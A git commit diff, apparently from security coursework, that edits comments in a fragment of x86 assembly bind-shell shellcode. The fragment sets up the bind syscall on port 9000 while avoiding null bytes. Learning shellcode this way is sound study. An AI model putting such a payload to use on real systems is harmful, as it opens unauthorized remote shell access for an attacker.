e6fedd3326fe5a033feb4de969279917e94ebd80
Felipe Winsnes <45699918+whitecr0wz@users.noreply.github.com>
2021-01-14 14:55:45 -0300

    Update 1.asm

--- Assignment_1/1.asm
+++ Assignment_1/1.asm
@@ -25,8 +25,8 @@ bind:
        push word 361          ; Pushes word 361 (bind) into the stack.
        pop ax                 ; Pops such word into ax so there are no nulls.
        mov ebx, esi           ; Copies the value from ESI to EBX, granting EBX the sockfd value from the socket syscall.
-       push edx               ; As the following parameter is a const struct sockaddr, and this is a bind shell, the first values aren't actually required, therefore, zeroes are pushed through EDX.
-       push edx               ; The same as stated above.
+       push edx               ; Pushes 0.
+       push edx               ; Pushes 0 for the address.
        push word 0x2823       ; Pushes the word 9000 into the stack.
        push word 0x02         ; Pushes AF_INET into the stack.
        mov ecx, esp           ; Copies the value of ESP into ECX.
